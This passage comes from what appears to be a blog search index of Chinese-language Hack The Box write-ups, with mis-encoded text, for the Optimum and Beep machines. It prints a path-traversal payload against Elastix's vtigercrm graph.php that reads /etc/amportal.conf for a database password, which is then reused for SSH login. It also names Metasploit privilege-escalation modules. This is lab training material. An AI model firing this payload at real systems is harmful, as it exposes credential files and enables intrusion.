<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-optimum/image-20250202180408340.png" class="" title="nmap">

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>è®¿é—®ç›®æ ‡</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223205864.png" class="" title="è·å–ç‰ˆæœ¬ä¿¡æ¯">

<p>ä½¿ç”¨searchsploit æ£€ç´¢å¯åˆ©ç”¨æ¼æ´ï¼Œå‘ç°ç›®æ ‡å¯èƒ½å­˜åœ¨RCE</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223259584.png" class="" title="searchsploit">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨msfconsoleè¿›è¡Œæ¼æ´åˆ©ç”¨</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223401263.png" class="" title="æ¼æ´åˆ©ç”¨">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨<code>post/multi/recon/local_exploit_suggester</code>æ£€æµ‹ä¸‹å½“å‰ç³»ç»Ÿå¯åˆ©ç”¨çš„ææƒæ¼æ´</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223426591.png" class="" title="æ”¶é›†ä¿¡æ¯">

<p>æ ¹æ®ç»“æœä½¿ç”¨ms16_032 è¿›è¡Œæƒé™æå‡</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250202185340241.png" class="" title="ææƒ">



<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\kostas\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Beep</title>
    <url>/Hackthebox/htb/htb-beep/</url>
    <content><![CDATA[<style>.yrmfwcjycesj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="yrmfwcjycesj">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-beep/image-20250202162932802.png" class="" title="nmap">

<p>æ·»åŠ æ˜ å°„</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.10.7  beep.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/hosts</code></pre>

<p>è®¿é—®<a href="https://beep.htb/">https://beep.htb</a> å‘ç°æ–°ç‰ˆç«ç‹æµè§ˆå™¨ä¸æ”¯æŒä½ç‰ˆæœ¬SSLï¼Œä¿®æ”¹æµè§ˆå™¨é…ç½®ï¼Œåœ°å€æ è¾“å…¥<code>about:config</code> , è¾“å…¥<code>security.tls.version.min</code> ä¿®æ”¹å€¼ä¸º1 </p>
<img src="/Hackthebox/htb/htb-beep/image-20250202170324934.png" class="" title="ä¿®æ”¹ç«ç‹é…ç½®">

<img src="/Hackthebox/htb/htb-beep/image-20250202170450821.png" class="" title="è®¿é—®ç›®æ ‡">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨searchsploit æ£€ç´¢Elastix ï¼ŒæŸ¥çœ‹<code>37637.pl</code> ,è·å–åˆ°payloadï¼š<code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>   æœç´¢å…³é”®å­— â€œAMPDBPASSâ€ è·å–åˆ°å¯†ç </p>
<img src="/Hackthebox/htb/htb-beep/image-20250202171030333.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-beep/image-20250202172215531.png" class="" title="payload">

<p>ä½¿ç”¨è·å–åˆ°çš„å¯†ç è¿›è¡Œsshç™»å½•ï¼Œå‘ç°ç®—æ³•ä¸æ”¯æŒï¼Œä¿®æ”¹ä¸€ä¸‹æœ¬åœ°é…ç½®ï¼šç¼–è¾‘ ~&#x2F;.ssh&#x2F;config æ·»åŠ </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Host *
  Ciphers +aes128-cbc
  KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
  HostKeyAlgorithms +ssh-rsa
</code></pre>

<img src="/Hackthebox/htb/htb-beep/image-20250202172249979.png" class="" title="ssh">

<img src="/Hackthebox/htb/htb-beep/image-20250202172514124.png" class="" title="ä¿®æ”¹sshé…ç½®">

<img src="/Hackthebox/htb/htb-beep/image-20250203203836733.png" class="" title="sshè®¿é—®">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;fanis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>å¯†ç é‡ç”¨</tag>
      </tags>
  </entry>
</search>
